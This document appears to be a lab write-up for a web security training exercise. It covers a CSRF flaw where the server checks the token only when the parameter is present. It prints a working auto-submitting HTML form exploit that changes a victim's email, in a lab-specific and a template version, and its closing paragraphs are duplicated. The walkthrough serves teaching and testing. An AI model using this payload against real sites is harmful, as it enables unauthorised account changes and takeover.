# Lab- CSRF where token validation depends on token being present

## Objective

Like the previous lab, this application's email change functionality uses a CSRF token to protect the `POST /my-account/change-email` request. This time, though, the flaw wasn't in _which HTTP method_ got validated — it was in _whether the token parameter needed to exist at all_. The goal was to figure out exactly what condition the server was actually checking, and build a working exploit around it.

---

## 1. Capturing the Legitimate Request

Same starting point as before: logged into the lab account (`wiener:peter`), turned on Burp's intercept, and submitted an email change from the account page.

```
POST /my-account/change-email HTTP/1.1
Host: 0a51007e030df31f81f7a7c700fa00b2.web-security-academy.net
Cookie: session=IsnWkAImpllimAxa8ILTsBObm7DDDHs6
Content-Type: application/x-www-form-urlencoded

email=hai12%40gmail.com&csrf=EwAOD6eCuK1XOvVmOtrC71AhMlFtzHp8
```

Both `email` and `csrf` were present in the body, exactly like the last lab. So my first instinct was to try the same bypass that had worked before.

<img width="1516" height="784" alt="image" src="https://github.com/user-attachments/assets/d6e7269f-a4b0-400c-bcbc-6c1d27f711f9" />

---

## 2. Reusing the Previous Bypass (Method Tampering)

Since the last lab's vulnerability was about the CSRF check only being wired into the `POST` handler, I tried the same approach here, switching the request method to `GET` via Burp's "Change request method" and forwarding it.

This time it didn't work. The server responded with:

```json
"Method Not Allowed"
```
<img width="1516" height="784" alt="image" src="https://github.com/user-attachments/assets/e1fcde77-7172-4fb0-9f0e-556ef33b2602" />


This told me something important: this application _does_ enforce the method correctly, so the bypass had to be something else. The lab's title "token validation depends on token being present" was the actual hint I'd skipped past at first, so I went back and reconsidered what "present" specifically meant here.

---

## 3. Reconsidering the Approach

Rather than testing whether the token's _value_ was being checked (e.g. sending an invalid or blank token), I considered a different possibility: what if the server's validation logic only runs the check when the `csrf` parameter exists in the request at all, meaning if the parameter is left out of the body entirely, rather than sent empty or wrong, the validation is skipped completely?

That's a common implementation mistake: something like `if (request.body.csrf) { validateToken() }` instead of always calling `validateToken()` and letting it fail on a missing value. If `csrf` is never sent, that `if` never triggers, and the request sails through unchecked.

This meant the exploit needed to send a `POST` request (since `GET` was blocked) with the `email` field but with **no** `**csrf**` **field in the request at all,** not blank, not invalid, just absent.

---

## 4. Building the Exploit

Since the bypass now depended on `POST` (not `GET`), I needed the classic CSRF self-submitting form instead of a simple `<img>` tag. I built an HTML page with a form targeting the vulnerable endpoint, containing only a hidden `email` input and deliberately no `csrf` input, then auto-submitted it with a script so the victim wouldn't need to click anything:

```html
<html>
  <body>
    <form action="https://0a51007e030df31f81f7a7c700fa00b2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="haidykareem@gmail.com">
    </form>
    <script> document.forms[0].submit(); </script>
  </body>
</html>
```

I pasted this into the exploit server's response body, using a fresh email address again since I'd already used one testing manually.

<img width="1568" height="782" alt="image" src="https://github.com/user-attachments/assets/551ef78c-d7c9-407a-80bf-64b008239c01" />

---

## 5. Delivering the Exploit

Clicked **Store**, then **Deliver exploit to victim**. The exploit server served the page to the simulated victim, whose browser rendered the form and immediately auto-submitted it via the script — sending a `POST /my-account/change-email` request with `email` set but no `csrf` parameter present anywhere in the body.

The lab flagged as solved right after delivery.

<img width="1568" height="778" alt="image" src="https://github.com/user-attachments/assets/28f3f2db-ada8-4ceb-89ce-9034707b697e" />

---

## 6. Final Payload

```html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker-controlled@gmail.com">
    </form>
    <script> document.forms[0].submit(); </script>
  </body>
</html>
```

The vulnerability: the server validates the `csrf` token's value only if the parameter is included in the request. Omitting the parameter entirely rather than sending it blank or invalid skips validation altogether.

---

## 7. Notes

This lab was a useful contrast to the previous one, because my first move was to reach for the exact same bypass (method tampering) and it flatly failed with a clean `"Method Not Allowed"` response. That was a good signal to stop and actually re-read what the lab was telling me, instead of assuming every CSRF lab in the same series breaks the same way.

The real lesson is about _how_ a token check is written, not just whether one exists. A validation function that only runs conditionally on the parameter being present (`if (csrf) { check() }`) is functionally different from one that always runs and treats a missing token as invalid by default. From the outside, both "protected" endpoints look identical until you specifically test omitting the parameter rather than sending a bad value for it which is now a technique I'll test by default alongside method tampering on every CSRF-protected endpoint going forward: try the token blank, try it invalid, and try it not sent at all, since each can behave completely differently depending on how the server-side check is implemented.

It's also a reminder that failed attempts are informative, not wasted the "Method Not Allowed" response wasn't a dead end, it was the piece of information that ruled out one hypothesis and pointed me toward the right one.

The real lesson is about _how_ a token check is written, not just whether one exists. A validation function that only runs conditionally on the parameter being present (`if (csrf) { check() }`) is functionally different from one that always runs and treats a missing token as invalid by default. From the outside, both "protected" endpoints look identical until you specifically test omitting the parameter rather than sending a bad value for it which is now a technique I'll test by default alongside method tampering on every CSRF-protected endpoint going forward: try the token blank, try it invalid, and try it not sent at all, since each can behave completely differently depending on how the server-side check is implemented.

It's also a reminder that failed attempts are informative, not wasted the "Method Not Allowed" response wasn't a dead end, it was the piece of information that ruled out one hypothesis and pointed me toward the right one
